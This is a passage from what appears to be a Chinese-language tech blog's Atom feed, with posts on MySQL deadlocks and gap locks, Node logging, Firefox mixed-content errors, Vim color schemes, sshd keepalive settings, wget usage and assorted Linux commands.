class="line">update gap set id &#x3D; 22 where id &#x3D; 20;</span><br></pre></td></tr></table></figure><p>在会话2中 插入<code>20 &gt; id &lt; 39</code>范围外的值时 可以执行成功,而当要插入 <code>[20,39)</code>范围内的值时 会遇到gap lock 。</p><ol start="4"><li>用会话1 查看当前正在进行中的事务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.INNODB_TRX;</span><br></pre></td></tr></table></figure></li></ol><p>不会意外，能看到下面两条记录：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155146.png" alt=""></p><p>可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。</p><p>这是因为执行update 语句之后，mysql 会执行索引扫描并在该表上施加一个 <code>next-key lock</code> ,向左扫描到20,向右扫描到39 ,锁定区间左闭右开,所以lock的范围是 <code>[20,39)</code>。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>根据实际情况的不同，有不同的方式可以避免死锁，这里介绍常用的几种：</p><ol><li>改变数据库操作逻辑，尽量避免在不同的事务中，对同一条记录进行更改。</li><li>如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/rainy-shurun/p/5166163.html" target="_blank" rel="noopener">Mysql 死锁原因分析</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 查看死锁和解除死锁</title>
    <link href="https://www.0x2beace.com/mysql-view-deadlock-and-release-deadlock/"/>
    <id>https://www.0x2beace.com/mysql-view-deadlock-and-release-deadlock/</id>
    <published>2020-07-19T08:07:48.000Z</published>
    <updated>2020-07-19T09:10:18.298Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间遇到了一个Mysql 死锁相关的问题，整理一下。</p><a id="more"></a><blockquote><p>问题描述：Mysql 的修改语句似乎都没有生效，同时使用Mysql GUI 工具编辑字段的值时会弹出异常。</p></blockquote><p><img src="https://i.loli.net/2020/06/28/3dXRhKHQWMlearC.png" alt="image.png"></p><h3 id="什么是死锁"><a href="#什么是死锁" class="headerlink" title="什么是死锁"></a>什么是死锁</h3><p>在解决Mysql 死锁的问题之前，还是先来了解一下什么是死锁。</p><p>死锁是指两个或两个以上的进程在执行过程中,因争夺资源而造成的一种互相等待的现象,若无外力作用,它们都将无法推进下去.此时称系统处于死锁状态或系统产生了死锁,这些永远在互相等的进程称为死锁进程。</p><h3 id="死锁的表现"><a href="#死锁的表现" class="headerlink" title="死锁的表现"></a>死锁的表现</h3><p>死锁的具体表现有两种：</p><ol><li>Mysql 增改语句无法正常生效</li><li>使用Mysql GUI 工具编辑字段的值时，会出现异常。</li></ol><h3 id="如何避免死锁"><a href="#如何避免死锁" class="headerlink" title="如何避免死锁"></a>如何避免死锁</h3><p>阻止死锁的途径就是避免满足死锁条件的情况发生，为此我们在开发的过程中需要遵循如下原则：</p><p>1.尽量避免并发的执行涉及到修改数据的语句。</p><p>2.要求每一个事务一次就将所有要使用到的数据全部加锁，否则就不允许执行。</p><p>3.预先规定一个加锁顺序，所有的事务都必须按照这个顺序对数据执行封锁。如不同的过程在事务内部对对象的更新执行顺序应尽量保证一致。</p><h3 id="查看死锁"><a href="#查看死锁" class="headerlink" title="查看死锁"></a>查看死锁</h3><p>Mysql 查询是否存在锁表有多种方式，这里只介绍一种最常用的。</p><h4 id="1-查看正在进行中的事务"><a href="#1-查看正在进行中的事务" class="headerlink" title="1. 查看正在进行中的事务"></a>1. 查看正在进行中的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.INNODB_TRX</span><br></pre></td></tr></table></figure><p>可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155146.png" alt=""></p><h4 id="2-查看正在锁的事务"><a href="#2-查看正在锁的事务" class="headerlink" title="2. 查看正在锁的事务"></a>2. 查看正在锁的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719163402.png" alt=""></p><h4 id="3-查看等待锁的事务"><a href="#3-查看等待锁的事务" class="headerlink" title="3. 查看等待锁的事务"></a>3. 查看等待锁的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155801.png" alt=""></p><h4 id="4-查询是否锁表"><a href="#4-查询是否锁表" class="headerlink" title="4. 查询是否锁表"></a>4. 查询是否锁表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW OPEN TABLES where In_use &gt; 0;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719163422.png" alt=""></p><h4 id="5-查看最近死锁的日志"><a href="#5-查看最近死锁的日志" class="headerlink" title="5. 查看最近死锁的日志"></a>5. 查看最近死锁的日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show engine innodb status</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719170929.png" alt=""></p><p>在发生死锁时，这几种方式都可以查询到和当前死锁相关的信息。</p><h3 id="解除死锁"><a href="#解除死锁" class="headerlink" title="解除死锁"></a>解除死锁</h3><p>如果需要解除死锁，有一种最简单粗暴的方式，那就是找到进程id之后，直接干掉。</p><p>查看当前正在进行中的进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show processlist</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 也可以使用</span><br><span class="line">SELECT * FROM information_schema.INNODB_TRX;</span><br></pre></td></tr></table></figure><p>上面两个命令找出来的进程id 是同一个。</p><p>杀掉进程对应的进程 id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill id</span><br></pre></td></tr></table></figure><p>验证（kill后再看是否还有锁）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW OPEN TABLES where In_use &gt; 0;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/duanxz/p/4394641.html" target="_blank" rel="noopener">Mysql 查看表和解锁表</a></li><li><a href="https://blog.csdn.net/LJFPHP/article/details/80599352" target="_blank" rel="noopener">Mysql 死锁是什么？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;前段时间遇到了一个Mysql 死锁相关的问题，整理一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>如何把 Console.log 的标准输出记录到文件</title>
    <link href="https://www.0x2beace.com/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/"/>
    <id>https://www.0x2beace.com/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/</id>
    <published>2020-07-18T08:16:51.000Z</published>
    <updated>2020-07-18T08:47:27.103Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把<code>console.log</code>的标准输出全部记录到文件中呢？</p><a id="more"></a><p>我是没有选择那些大名鼎鼎的日志模块，如：</p><ul><li><a href="https://github.com/winstonjs/winston" target="_blank" rel="noopener">winston</a> - A logger for just about everything.</li><li><a href="https://github.com/log4js-node/log4js-node" target="_blank" rel="noopener">log4js</a> - A port of log4js to node.js</li></ul><p>因为我的需求够简单，只需要能把日志记录到文件就行，所以使用了下面这种最简单的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var log_file &#x3D; fs.createWriteStream(path.resolve(__dirname, &quot;.pm2&quot;) + &#39;&#x2F;debug.log&#39;, &#123;flags : &#39;w&#39;&#125;);</span><br><span class="line">var log_stdout &#x3D; process.stdout;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 重载console.log 函数</span><br><span class="line"> *&#x2F;</span><br><span class="line">console.log &#x3D; function() &#123;</span><br><span class="line">    var res &#x3D; &quot;&quot;,</span><br><span class="line">    len &#x3D; arguments.length;</span><br><span class="line">    for(var i&#x3D;0; i&lt;len; i++)&#123;</span><br><span class="line">        res +&#x3D; arguments[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_file.write(util.format(res) + &#39;\n&#39;);</span><br><span class="line">    log_stdout.write(util.format(res) + &#39;\n&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/8393636/node-log-in-a-file-instead-of-the-console" target="_blank" rel="noopener">Node: log in a file instead of the console</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把&lt;code&gt;console.log&lt;/code&gt;的标准输出全部记录到文件中呢？&lt;/p&gt;</summary>
    
    
    
    <category term="一些经验" scheme="https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"/>
    
    
    <category term="Node" scheme="https://www.0x2beace.com/tags/Node/"/>
    
  </entry>
  
  <entry>
    <title>解决Firefox “已阻止载入混合活动内容”</title>
    <link href="https://www.0x2beace.com/resolve-firefox-has-blocked-loading-of-mixed-active-content/"/>
    <id>https://www.0x2beace.com/resolve-firefox-has-blocked-loading-of-mixed-active-content/</id>
    <published>2020-07-18T07:15:30.000Z</published>
    <updated>2020-09-20T15:40:46.029Z</updated>
    
    <content type="html"><![CDATA[<p>最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的<code>http</code>与<code>https</code>之间的转换。</p><p>网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常：</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200718144533.png" alt="异常内容"></p><p>这时我才意识到并不是网络延迟的问题，而是项目没有配置好。</p><h2 id="什么是混合内容"><a href="#什么是混合内容" class="headerlink" title="什么是混合内容"></a>什么是混合内容</h2><blockquote><p>当用户访问使用HTTPS的页面时，他们与web服务器之间的连接是使用SSL加密的，从而保护连接不受嗅探器和中间人攻击。<br>如果HTTPS页面包括由普通明文HTTP连接加密的内容，那么连接只是被部分加密：非加密的内容可以被嗅探者入侵，并且可以被中间人攻击者修改，因此连接不再受到保护。当一个网页出现这种情况时，它被称为混合内容页面。 —— <a href="https://developer.mozilla.org/zh-CN/docs/Security/MixedContent" target="_blank" rel="noopener">MDN</a></p></blockquote><p>通俗一点解释就是：<code>https</code> 的页面中混合着<code>http</code> 的请求，而这种请求不会被浏览器正常接受的，也被称作为混合内容页面。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>既然已经明白了为什么会产生这个问题，那么要解决起来也就非常简单了。</p><h3 id="让Firefox暂时不阻止"><a href="#让Firefox暂时不阻止" class="headerlink" title="让Firefox暂时不阻止"></a>让Firefox暂时不阻止</h3><ol><li>打开新标签页，在地址栏输入 <code>about:config</code>，进入<code>FireFox</code>高级配置页面。</li><li>搜索<code>security.mixed_content.block_active_content</code>，将默认值<code>true</code>更改为<code>false</code>。</li></ol><p>这种方式仅适用于本地调试。</p><h3 id="避免在HTTPS页面中包含HTTP的内容"><a href="#避免在HTTPS页面中包含HTTP的内容" class="headerlink" title="避免在HTTPS页面中包含HTTP的内容"></a>避免在HTTPS页面中包含HTTP的内容</h3><p>更直接有效的方式应该是约定好项目中的协议，统一使用<code>https</code>或者<code>http</code>。</p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Security/MixedContent" target="_blank" rel="noopener">什么是混合内容——MDN</a></li><li><a href="https://segmentfault.com/a/1190000015722535" target="_blank" rel="noopener">https访问遇到“已阻止载入混合内容”</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的&lt;code&gt;http&lt;/code&gt;与&lt;code&gt;https&lt;/code&gt;之间的转换。&lt;/p&gt;
&lt;p&gt;网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常：&lt;/p&gt;</summary>
    
    
    
    <category term="一些经验" scheme="https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"/>
    
    
    <category term="HTTPS" scheme="https://www.0x2beace.com/tags/HTTPS/"/>
    
    <category term="HTTP" scheme="https://www.0x2beace.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>Vim 安装 molokai 配色方案</title>
    <link href="https://www.0x2beace.com/vim-install-molokai-color-scheme/"/>
    <id>https://www.0x2beace.com/vim-install-molokai-color-scheme/</id>
    <published>2020-07-18T06:36:04.000Z</published>
    <updated>2020-07-18T06:38:53.741Z</updated>
    
    <content type="html"><![CDATA[<p>像<a href="https://github.com/altercation/solarized" target="_blank" rel="noopener">solarized</a>、<a href="https://github.com/morhetz/gruvbox" target="_blank" rel="noopener">gruvbox</a>、 <a href="https://github.com/tomasr/molokai" target="_blank" rel="noopener">molokai</a>、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 <code>molokai</code> 。</p><a id="more"></a><p>按照顺序执行完上面的命令，即可使用最经典的配色方案了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir .vim &amp;&amp; cd .vim</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tomasr&#x2F;molokai.git</span><br><span class="line">cp -rf molokai&#x2F;colors&#x2F; .&#x2F;colors</span><br><span class="line">echo colorscheme molokai &gt;&gt; ~&#x2F;.vimrc</span><br><span class="line">echo set t_Co&#x3D;256 &gt;&gt; ~&#x2F;.vimrc</span><br><span class="line">echo set background&#x3D;dark  &gt;&gt; ~&#x2F;.vimrc</span><br></pre></td></tr></table></figure><p>实际效果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200718142924.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;像&lt;a href=&quot;https://github.com/altercation/solarized&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;solarized&lt;/a&gt;、&lt;a href=&quot;https://github.com/morhetz/gruvbox&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gruvbox&lt;/a&gt;、 &lt;a href=&quot;https://github.com/tomasr/molokai&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;molokai&lt;/a&gt;、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 &lt;code&gt;molokai&lt;/code&gt; 。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Vim" scheme="https://www.0x2beace.com/tags/Vim/"/>
    
  </entry>
  
  <entry>
    <title>sshd_config 常用配置项</title>
    <link href="https://www.0x2beace.com/sshd-config-common-configuration-items/"/>
    <id>https://www.0x2beace.com/sshd-config-common-configuration-items/</id>
    <published>2020-07-17T15:17:09.000Z</published>
    <updated>2020-07-17T15:18:28.234Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来收录那些常用的<code>sshd_config</code>配置项。</p><a id="more"></a><h3 id="保持链接"><a href="#保持链接" class="headerlink" title="保持链接"></a>保持链接</h3><p>保持客户端与服务端之间的连接保持活动状态似乎是最常见策略。</p><ul><li><code>ServerAliveInterval</code>：客户端在向服务器发送空数据包之前（等待连接保持活动状态）将等待的秒数。</li><li><code>ClientAliveInterval</code>：服务器在向客户端发送空数据包之前（等待连接保持活动状态）将等待的秒数。</li></ul><p>设置为0（默认值）将禁用这些功能，因此如果空闲时间太长，连接可能会断开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host myhostshortcut</span><br><span class="line">     HostName myhost.com</span><br><span class="line">     User barthelemy</span><br><span class="line">     ServerAliveInterval 60</span><br><span class="line">     ServerAliveCountMax 10</span><br></pre></td></tr></table></figure><p>这么设置的作用是：客户端将等待空闲60秒钟（<code>ServerAliveInterval</code>时间），然后向服务器发送 <code>no-op null</code>数据包，并期待响应。</p><p>如果没有响应，则它将继续尝试上述过程直到10次（ServerAliveCountMax 次数 10 * 60 = 600秒）。如果服务器仍然没有响应，则客户端将断开ssh连接。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://unix.stackexchange.com/questions/3026/what-options-serveraliveinterval-and-clientaliveinterval-in-sshd-config-exac" target="_blank" rel="noopener">如何让ssh客户端与服务端保持连接</a></li><li><a href="https://linux.die.net/man/5/sshd_config" target="_blank" rel="noopener">sshd_config 参考手册</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来收录那些常用的&lt;code&gt;sshd_config&lt;/code&gt;配置项。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="命令整理" scheme="https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="ssh" scheme="https://www.0x2beace.com/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Wget 使用技巧</title>
    <link href="https://www.0x2beace.com/wget-tips/"/>
    <id>https://www.0x2beace.com/wget-tips/</id>
    <published>2020-07-16T15:30:39.000Z</published>
    <updated>2020-07-16T15:31:23.790Z</updated>
    
    <content type="html"><![CDATA[<p><code>wget</code> 是一个命令行的下载工具，对于经常使用<code>Linux</code>的用户来说，真是再熟悉不过了。下面总结了一些实用的<code>wget</code>使用技巧，可能会让你更加高效地使用 <code>wget</code>。</p><a id="more"></a><h3 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h3><p>最常见的使用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget http:&#x2F;&#x2F;example.com&#x2F;filename.txt</span><br></pre></td></tr></table></figure><p>wget默认会以最后一个符合 <code>/</code> 的后面的字符来对下载文件命名，对于动态链接的下载通常文件名会不正确。</p><p>如果希望对这个下载的文件进行重命名，我们可以使用参数 <code>-O</code> 来指定一个文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -O file.zip http:&#x2F;&#x2F;example.com&#x2F;filename.txt</span><br></pre></td></tr></table></figure><h3 id="后台下载"><a href="#后台下载" class="headerlink" title="后台下载"></a>后台下载</h3><p>当需要下载比较大的文件时，使用参数 <code>-b</code> 可以隐藏在后台进行下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -b http:&#x2F;&#x2F;wppkg.baidupcs.com&#x2F;issue&#x2F;netdisk&#x2F;MACguanjia&#x2F;BaiduNetdisk_mac_3.2.0.9.dmg</span><br></pre></td></tr></table></figure><p>然后可以使用以下命令查看当前的进度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tail -f wget-log</span><br></pre></td></tr></table></figure><h3 id="下载目录"><a href="#下载目录" class="headerlink" title="下载目录"></a>下载目录</h3><p>这条命令可以下载 <a href="http://example.com" target="_blank" rel="noopener">http://example.com</a> 网站上 packages 目录中的所有文件。</p><p>参数说明：</p><ul><li><code>-r</code>：下载目录</li><li><code>-np</code>：不遍历父目录</li><li><code>-nd</code>：不在本机重新创建目录结构</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -r -np -nd http:&#x2F;&#x2F;example.com&#x2F;packages&#x2F;</span><br></pre></td></tr></table></figure><p>与上一条命令相似，但多加了一个 <code>--accept=iso</code> 选项，这指示 wget 仅下载 i386 目录中所有扩展名为 iso 的文件。你也可以指定多个扩展名，只需用逗号分隔即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -r -np -nd --accept&#x3D;iso http:&#x2F;&#x2F;example.com&#x2F;centos-5&#x2F;i386&#x2F;</span><br></pre></td></tr></table></figure><h3 id="批量下载"><a href="#批量下载" class="headerlink" title="批量下载"></a>批量下载</h3><p>此命令常用于批量下载的情形，把所有需要下载文件的地址放到 filename.txt 中，然后 wget 就会自动为你下载所有文件了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -i filename.txt</span><br></pre></td></tr></table></figure><h3 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h3><p>通常我们在下载大文件时，为了防止中途因为网络不稳定等因素所引起的下载失败，可以使用 <code>-c</code> 参数，作为断点续传。</p><p>好处是：如果当时下载失败了，之后再次下载该文件时，会继续上一次的下载，而不用重头下载了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -c http:&#x2F;&#x2F;example.com&#x2F;really-big-file.iso</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>该命令可用来镜像一个网站，wget 将对链接进行转换。如果网站中的图像是放在另外的站点，那么可以使用 -H 选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -m -k (-H) http:&#x2F;&#x2F;www.example.com&#x2F;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://linuxtoy.org/archives/wget-tips.html" target="_blank" rel="noopener">wget 使用技巧</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;wget&lt;/code&gt; 是一个命令行的下载工具，对于经常使用&lt;code&gt;Linux&lt;/code&gt;的用户来说，真是再熟悉不过了。下面总结了一些实用的&lt;code&gt;wget&lt;/code&gt;使用技巧，可能会让你更加高效地使用 &lt;code&gt;wget&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="命令整理" scheme="https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>一些实用的 Linux 命令</title>
    <link href="https://www.0x2beace.com/some-practical-linux-commands/"/>
    <id>https://www.0x2beace.com/some-practical-linux-commands/</id>
    <published>2020-07-16T15:26:13.000Z</published>
    <updated>2020-09-05T02:10:46.310Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。</p><a id="more"></a><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo !!"></a>sudo !!</h3><p>有时候我们好不容易输完一长串命令，却被提示”权限不足”，如果这个时候有一个命令记住上一次的输入内容那该多好。</p><p>还真有，<code>!!</code>命令可以获取最后一次输入的命令，所以我们直接输入下面这个命令就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo !!</span><br></pre></td></tr></table></figure><p>注意中间有一个空格。</p><h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><p><code>nl</code> 命令类似<code>cat</code>命令，都是查看文件内容，但不同之处在于：<code>nl</code>命令会在文本内容的每一行前面，添加行号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.txt</span><br><span class="line">boo</span><br><span class="line">mac</span><br><span class="line">$ nl test.txt</span><br><span class="line">1. boo</span><br><span class="line">2. mac</span><br></pre></td></tr></table></figure><h3 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h3><p>以树状的形式返回当前目录的文件夹结构，这个命令很好用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tree </span><br><span class="line">.</span><br><span class="line">└── test.txt</span><br><span class="line"></span><br><span class="line">0 directories, 1 file</span><br></pre></td></tr></table></figure><h3 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h3><p>和<code>tree</code>类似，不过它是返回当前运行的所有进程及其相关的子进程的树状结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pstree | grep php</span><br><span class="line">|-+&#x3D; 01365 boo nginx: master process &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g daemon off;</span><br><span class="line"> | \--- 01410 boo nginx: worker process</span><br><span class="line"> | |     \--- 73098 boo grep --color&#x3D;auto nginx</span><br></pre></td></tr></table></figure><h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>这个命令特别实用，可以用来查看域名解析情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dig 0x2BeAce.com +nostats +nocomments +nocmd</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +nostats +nocomments +nocmd</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;0x2BeAce.com.INA</span><br><span class="line">0x2BeAce.com.3581INA185.199.108.153</span><br><span class="line">0x2BeAce.com.3581INA185.199.110.153</span><br><span class="line">0x2BeAce.com.3581INA185.199.111.153</span><br><span class="line">0x2BeAce.com.3581INA185.199.109.153</span><br><span class="line">0x2BeAce.com.3581INNSns12.domaincontrol.com.</span><br><span class="line">0x2BeAce.com.3581INNSns11.domaincontrol.com.</span><br><span class="line">ns12.domaincontrol.com.59833INA173.201.73.6</span><br><span class="line">ns11.domaincontrol.com.92984INA97.74.105.6</span><br><span class="line">ns12.domaincontrol.com.146699INAAAA2603:5:2290::6</span><br><span class="line">ns11.domaincontrol.com.92042INAAAA2603:5:2190::6</span><br></pre></td></tr></table></figure><h3 id="lt-空格-gt-命令"><a href="#lt-空格-gt-命令" class="headerlink" title="&lt;空格&gt; 命令"></a>&lt;空格&gt; 命令</h3><p>这是一个有趣的命令，总所周知，用户在终端上键入的每一个命令都会被记录到<code>history</code>中，那么有没有一个命令可以骗过<code>history</code>，而不被记入呢？答案是有的。</p><p>在终端，只需要在键入命令之前输入一个或多个空格，这样你的命令就不会被记录了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 